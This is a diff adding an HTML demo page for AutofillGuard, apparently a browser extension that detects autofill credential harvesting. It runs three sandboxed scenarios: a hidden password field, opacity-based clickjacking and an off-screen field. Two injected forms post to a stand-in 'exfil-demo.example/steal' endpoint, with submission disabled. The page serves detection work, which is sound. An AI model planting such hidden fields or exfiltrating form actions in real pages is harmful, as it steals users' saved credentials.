@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PhishOps Demo: AutofillGuard</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Work+Sans:wght@400;500;600;700&display=swap');
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: #0A0907;
+      color: #D4CCBC;
+      font-family: 'Work Sans', system-ui, -apple-system, sans-serif;
+      padding: 40px;
+      max-width: 900px;
+      margin: 0 auto;
+    }
+    .header {
+      border-bottom: 2px solid #2A2520;
+      padding-bottom: 16px;
+      margin-bottom: 24px;
+    }
+    h1 { color: #D4CCBC; font-size: 20px; font-weight: 600; text-transform: lowercase; }
+    .badge {
+      display: inline-block;
+      background: #BF1B1B;
+      color: #F5F0E8;
+      font-size: 11px;
+      padding: 2px 8px;
+      margin-left: 8px;
+      vertical-align: middle;
+      text-transform: lowercase;
+    }
+    .safe-notice {
+      background: rgba(212,134,26,0.08);
+      border: 1px solid #2A2520;
+      padding: 12px 16px;
+      margin-bottom: 24px;
+      font-size: 13px;
+      line-height: 1.5;
+      color: #D4861A;
+    }
+    .safe-notice strong { color: #D4861A; }
+    .threat-card {
+      background: #141210;
+      border: 1px solid #2A2520;
+      padding: 20px;
+      margin-bottom: 20px;
+    }
+    .threat-card h2 { color: #D4861A; font-size: 15px; margin-bottom: 8px; font-weight: 600; }
+    .threat-card p { font-size: 13px; color: #8C7A5C; line-height: 1.5; margin-bottom: 12px; }
+    .attack-flow {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 12px;
+      color: #6B6560;
+      margin-bottom: 16px;
+      flex-wrap: wrap;
+    }
+    .attack-flow .step {
+      background: #1E1B18;
+      padding: 4px 10px;
+      border: 1px solid #2A2520;
+    }
+    .attack-flow .arrow { color: #BF1B1B; }
+    button.run-btn {
+      background: #BF1B1B;
+      color: #F5F0E8;
+      border: none;
+      padding: 10px 20px;
+      cursor: pointer;
+      font-family: 'Work Sans', system-ui, sans-serif;
+      font-size: 13px;
+      font-weight: 600;
+      margin-right: 8px;
+      transition: background 0.15s;
+    }
+    button.run-btn:hover { background: #A31717; }
+    button.reset-btn {
+      background: transparent;
+      color: #6B6560;
+      border: 1px solid #2A2520;
+      padding: 10px 20px;
+      cursor: pointer;
+      font-family: 'Work Sans', system-ui, sans-serif;
+      font-size: 13px;
+      transition: all 0.15s;
+    }
+    button.reset-btn:hover { border-color: #D4CCBC; color: #D4CCBC; }
+    .sandbox {
+      background: #0F0D0B;
+      border: 1px solid #2A2520;
+      padding: 16px;
+      margin-top: 12px;
+      min-height: 60px;
+    }
+    .sandbox label { font-size: 12px; color: #6B6560; display: block; margin-bottom: 4px; }
+    .sandbox input { margin-bottom: 8px; }
+    #log-panel {
+      background: #0F0D0B;
+      border: 1px solid #2A2520;
+      padding: 16px;
+      margin-top: 24px;
+      max-height: 300px;
+      overflow-y: auto;
+      font-family: 'SF Mono', 'Fira Code', monospace;
+      font-size: 12px;
+    }
+    #log-panel h3 { color: #D4CCBC; font-size: 13px; margin-bottom: 8px; font-weight: 600; text-transform: lowercase; }
+    .log-entry {
+      padding: 4px 0;
+      border-bottom: 1px solid #141210;
+      line-height: 1.4;
+    }
+    .log-entry .signal { color: #D4861A; }
+    .log-entry .score { color: #BF1B1B; font-weight: 600; }
+    .log-entry .ok { color: #3A6B1C; }
+    .signal-grid {
+      display: grid;
+      grid-template-columns: 1fr auto auto;
+      gap: 4px 12px;
+      font-size: 12px;
+      margin-top: 8px;
+    }
+    .signal-grid .hdr { color: #4A4540; font-weight: 600; }
+    .signal-grid .fired { color: #BF1B1B; }
+    .signal-grid .weight { color: #D4861A; }
+  </style>
+</head>
+<body>
+
+<div class="header">
+  <h1>autofillguard <span class="badge">demo</span></h1>
+  <p style="color:#6B6560; font-size:13px; margin-top:6px;">
+    autofill credential harvesting detection &mdash; kuosmanen 2017 + t&oacute;th DEF CON 33 2025
+  </p>
+</div>
+
+<div class="safe-notice">
+  <strong>safe simulation.</strong> This page demonstrates AutofillGuard detection capabilities.
+  No real credentials are collected or transmitted. All attack scenarios run in isolated sandboxes
+  within this page. The extension's content script detects the hidden fields and fires alerts.
+</div>
+
+<!-- ================================================================== -->
+<!-- Scenario A: Hidden Field Harvest -->
+<!-- ================================================================== -->
+
+<div class="threat-card">
+  <h2>scenario a: hidden field harvest (kuosmanen 2017)</h2>
+  <p>
+    A visible email field is shown to the user, but a <code>display:none</code> password field
+    silently captures autofilled credentials. The form submits both fields to an external URL.
+    This is the original 2017 autofill phishing technique.
+  </p>
+  <div class="attack-flow">
+    <span class="step">visible email field</span>
+    <span class="arrow">&rarr;</span>
+    <span class="step">hidden password field (display:none)</span>
+    <span class="arrow">&rarr;</span>
+    <span class="step">cross-origin form action</span>
+    <span class="arrow">&rarr;</span>
+    <span class="step" style="border-color:#BF1B1B; color:#BF1B1B;">credentials exfiltrated</span>
+  </div>
+  <button class="run-btn" onclick="runScenarioA()">run scenario a</button>
+  <button class="reset-btn" onclick="resetSandbox('sandbox-a')">reset</button>
+  <div class="sandbox" id="sandbox-a"></div>
+</div>
+
+<!-- ================================================================== -->
+<!-- Scenario B: Body Opacity Clickjacking -->
+<!-- ================================================================== -->
+
+<div class="threat-card">
+  <h2>scenario b: extension clickjacking (t&oacute;th 2025)</h2>
+  <p>
+    The page sets <code>opacity:0</code> on a container element, making everything inside invisible &mdash;
+    including the password manager's autofill popup. The user sees an innocuous overlay and unknowingly
+    clicks the invisible autofill button. This is the DEF CON 33 DOM-based Extension Clickjacking vector.
+  </p>
+  <div class="attack-flow">
+    <span class="step">container opacity: 0</span>
+    <span class="arrow">&rarr;</span>
+    <span class="step">password field inside (invisible)</span>
+    <span class="arrow">&rarr;</span>
+    <span class="step">PM autofill UI invisible</span>
+    <span class="arrow">&rarr;</span>
+    <span class="step" style="border-color:#BF1B1B; color:#BF1B1B;">user clicks invisible autofill</span>
+  </div>
+  <button class="run-btn" onclick="runScenarioB()">run scenario b</button>
+  <button class="reset-btn" onclick="resetSandbox('sandbox-b')">reset</button>
+  <div class="sandbox" id="sandbox-b"></div>
+</div>
+
+<!-- ================================================================== -->
+<!-- Scenario C: Off-Screen Field -->
+<!-- ================================================================== -->
+
+<div class="threat-card">
+  <h2>scenario c: off-screen field + form exfiltration</h2>
+  <p>
+    A password field is positioned at <code>left:-9999px</code> (off-screen) while a visible
+    decoy form is shown. The off-screen field captures autofilled credentials and the form
+    submits them to an external endpoint.
+  </p>
+  <div class="attack-flow">
+    <span class="step">visible decoy form</span>
+    <span class="arrow">&rarr;</span>
+    <span class="step">off-screen password field (left:-9999px)</span>
+    <span class="arrow">&rarr;</span>
+    <span class="step">external form action</span>
+    <span class="arrow">&rarr;</span>
+    <span class="step" style="border-color:#BF1B1B; color:#BF1B1B;">silent exfiltration</span>
+  </div>
+  <button class="run-btn" onclick="runScenarioC()">run scenario c</button>
+  <button class="reset-btn" onclick="resetSandbox('sandbox-c')">reset</button>
+  <div class="sandbox" id="sandbox-c"></div>
+</div>
+
+<!-- ================================================================== -->
+<!-- Log Panel -->
+<!-- ================================================================== -->
+
+<div id="log-panel">
+  <h3>detection log</h3>
+  <div id="log-entries">
+    <div class="log-entry" style="color:#4A4540;">Click a scenario button to run detection...</div>
+  </div>
+</div>
+
+<script type="module">
+  import {
+    getCredentialFields,
+    getFieldVisibilitySignals,
+    isLikelyFalsePositive,
+    checkClickjackingSignals,
+    calculateAutofillRiskScore,
+  } from '../content/autofill_guard.js';
+
+  const logEl = document.getElementById('log-entries');
+
+  function log(html) {
+    const entry = document.createElement('div');
+    entry.className = 'log-entry';
+    entry.innerHTML = `<span style="color:#4A4540;">[${new Date().toLocaleTimeString()}]</span> ${html}`;
+    logEl.appendChild(entry);
+    logEl.scrollTop = logEl.scrollHeight;
+  }
+
+  function clearLog() {
+    logEl.innerHTML = '';
+  }
+
+  // Scenario A: Hidden Field Harvest
+  window.runScenarioA = function() {
+    clearLog();
+    const sandbox = document.getElementById('sandbox-a');
+    sandbox.innerHTML = `
+      <form action="https://exfil-demo.example/steal" onsubmit="return false;">
+        <label>Email:</label>
+        <input type="email" name="email" value="victim@example.com" style="width:100%; padding:6px; margin-bottom:8px; background:#1E1B18; border:1px solid #2A2520; color:#D4CCBC;">
+        <input type="password" name="password" style="display:none" value="P@ssw0rd123">
+        <button type="submit" style="padding:8px 16px; background:#1E1B18; color:#D4CCBC; border:1px solid #2A2520; cursor:pointer; font-family:'Work Sans',sans-serif;">Sign In</button>
+      </form>
+    `;
+
+    log('<strong>Scenario A:</strong> Injected visible email + hidden password (display:none) + cross-origin form');
+
+    const fields = sandbox.querySelectorAll('input[type="password"]');
+    for (const field of fields) {
+      const signals = getFieldVisibilitySignals(field);
+      const form = field.closest('form');
+      const suppressed = isLikelyFalsePositive(field, form);
+
+      if (signals.length > 0) {
+        log(`<span class="signal">SIGNAL</span> ${signals.map(s => `${s.id} (${s.weight})`).join(', ')}${suppressed ? ' <span class="ok">[SUPPRESSED]</span>' : ''}`);
+      }
+    }
+
+    const clickjackSigs = checkClickjackingSignals();
+    const fieldSigs = getFieldVisibilitySignals(fields[0]);
+    const { riskScore, signalList, vector } = calculateAutofillRiskScore({
+      fieldSignals: fieldSigs,
+      exfilSignals: [{ id: 'exfil:cross_origin_action', weight: 0.25 }],
+      clickjackSignals: clickjackSigs,
+    });
+
+    log(`<span class="score">RISK SCORE: ${riskScore.toFixed(2)}</span> | Vector: ${vector} | Signals: ${signalList.join(', ')}`);
+    if (riskScore >= 0.50) {
+      log(`<span class="fired">ALERT: AutofillGuard would block this page</span>`);
+    }
+  };
+
+  // Scenario B: Clickjacking
+  window.runScenarioB = function() {
+    clearLog();
+    const sandbox = document.getElementById('sandbox-b');
+    sandbox.innerHTML = `
+      <div id="clickjack-container" style="opacity:0; position:relative;">
+        <input type="password" value="autofilled-secret" style="width:200px; padding:6px;">
+        <p style="color:#6B6560; font-size:12px; margin-top:4px;">This content is invisible (opacity:0)</p>
+      </div>
+      <div style="margin-top:8px; padding:8px; background:#1E1B18; font-size:12px; color:#6B6560;">
+        Visible overlay: "Click here to verify your identity"
+      </div>
+    `;
+
+    log('<strong>Scenario B:</strong> Container with opacity:0 containing password field + visible overlay');
+
+    const container = document.getElementById('clickjack-container');
+    log(`<span class="signal">SIGNAL</span> Container opacity: ${container.style.opacity} (simulating body.opacity attack)`);
+
+    const clickjackSigs = checkClickjackingSignals();
+    if (clickjackSigs.length > 0) {
+      log(`<span class="signal">CLICKJACK SIGNALS</span> ${clickjackSigs.map(s => `${s.id} (${s.weight})`).join(', ')}`);
+    }
+
+    const fields = sandbox.querySelectorAll('input[type="password"]');
+    for (const field of fields) {
+      const signals = getFieldVisibilitySignals(field);
+      if (signals.length > 0) {
+        log(`<span class="signal">FIELD SIGNAL</span> ${signals.map(s => `${s.id} (${s.weight})`).join(', ')}`);
+      }
+    }
+
+    const fieldSigs = fields.length > 0 ? getFieldVisibilitySignals(fields[0]) : [];
+    const { riskScore, signalList, vector } = calculateAutofillRiskScore({
+      fieldSignals: fieldSigs,
+      exfilSignals: [],
+      clickjackSignals: clickjackSigs,
+    });
+
+    log(`<span class="score">RISK SCORE: ${riskScore.toFixed(2)}</span> | Vector: ${vector} | Signals: ${signalList.join(', ')}`);
+    if (riskScore >= 0.50) {
+      log(`<span class="fired">ALERT: AutofillGuard would restore page visibility and warn user</span>`);
+    } else {
+      log(`<span class="ok">Note: Container-level opacity (not body/html) is detected via field visibility signals, not page-level clickjack signals</span>`);
+    }
+  };
+
+  // Scenario C: Off-Screen
+  window.runScenarioC = function() {
+    clearLog();
+    const sandbox = document.getElementById('sandbox-c');
+    sandbox.innerHTML = `
+      <form action="https://exfil-demo.example/steal" onsubmit="return false;">
+        <label>Username:</label>
+        <input type="text" name="username" value="user@corp.com" style="width:100%; padding:6px; margin-bottom:8px; background:#1E1B18; border:1px solid #2A2520; color:#D4CCBC;">
+        <input type="password" name="password" style="position:absolute; left:-9999px;" value="OffScreenSecret">
+        <button type="submit" style="padding:8px 16px; background:#1E1B18; color:#D4CCBC; border:1px solid #2A2520; cursor:pointer; font-family:'Work Sans',sans-serif;">Continue</button>
+      </form>
+    `;
+
+    log('<strong>Scenario C:</strong> Visible username + off-screen password (left:-9999px) + external form');
+
+    const fields = sandbox.querySelectorAll('input[type="password"]');
+    for (const field of fields) {
+      const signals = getFieldVisibilitySignals(field);
+      const form = field.closest('form');
+      const suppressed = isLikelyFalsePositive(field, form);
+
+      if (signals.length > 0) {
+        log(`<span class="signal">SIGNAL</span> ${signals.map(s => `${s.id} (${s.weight})`).join(', ')}${suppressed ? ' <span class="ok">[SUPPRESSED]</span>' : ''}`);
+      }
+    }
+
+    const fieldSigs = fields.length > 0 ? getFieldVisibilitySignals(fields[0]) : [];
+    const { riskScore, signalList, vector } = calculateAutofillRiskScore({
+      fieldSignals: fieldSigs,
+      exfilSignals: [{ id: 'exfil:cross_origin_action', weight: 0.25 }],
+      clickjackSignals: [],
+    });
+
+    log(`<span class="score">RISK SCORE: ${riskScore.toFixed(2)}</span> | Vector: ${vector} | Signals: ${signalList.join(', ')}`);
+    if (riskScore >= 0.50) {
+      log(`<span class="fired">ALERT: AutofillGuard would disable off-screen fields and block submission</span>`);
+    }
+  };
+
+  // Reset sandbox
+  window.resetSandbox = function(id) {
+    document.getElementById(id).innerHTML = '';
+    clearLog();
+    log('<span style="color:#4A4540;">Sandbox reset. Click a scenario to run detection.</span>');
+  };
+</script>
+
+</body>
+</html>
